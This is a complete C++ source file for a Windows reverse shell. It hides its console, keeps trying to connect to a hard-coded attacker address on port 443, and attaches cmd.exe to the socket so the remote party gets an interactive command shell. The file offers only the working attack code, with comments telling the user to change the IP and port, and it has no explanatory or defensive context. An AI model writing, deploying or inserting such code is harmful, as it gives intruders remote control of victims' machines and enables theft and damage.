#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <string>

#pragma comment(lib, "Ws2_32.lib")


int main(int argc, char** argv)
{
    FreeConsole();

    // Keep trying to connect, even if shell on attacker closes
    while (true)
    {   // Change ip and port
        char ip[] = "10.10.10.10";
        int port = 443;
        SOCKET socket;
        sockaddr_in addr;
        WSADATA version;
        // Initialize Winsock
        auto iResult = WSAStartup(MAKEWORD(2, 2), &version);
        // Create socket
        socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(ip);
        addr.sin_port = htons(port);

        // Try to connect to remote host
        // If error, close the socket and try again
        if (WSAConnect(socket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
        {
            closesocket(socket);
            WSACleanup();
            continue;
        }
        // Otherwise receive data, unless there's a negative status code
        else
        {
            char data[1024];
            memset(data, 0, sizeof(data));
            int code = recv(socket, data, 1024, 0);
            if (code <= 0)
            {
                closesocket(socket);
                WSACleanup();
                continue;
            }
            else
            {
                // Set Windows properties using STARTUPINFO
                char procName[8] = "cmd.exe";
                STARTUPINFO sui;
                PROCESS_INFORMATION pi;
                memset(&sui, 0, sizeof(sui));
                sui.cb = sizeof(sui);
                sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)socket;
                // Start cmd.exe with redirected streams
                CreateProcess(NULL, procName, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
                WaitForSingleObject(pi.hProcess, INFINITE);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);

                memset(data, 0, sizeof(data));
                int code = recv(socket, data, 1024, 0);
                if (code <= 0)
                {
                    closesocket(socket);
                    WSACleanup();
                    continue;
                }
            }
        }
    }

    return 0;
}
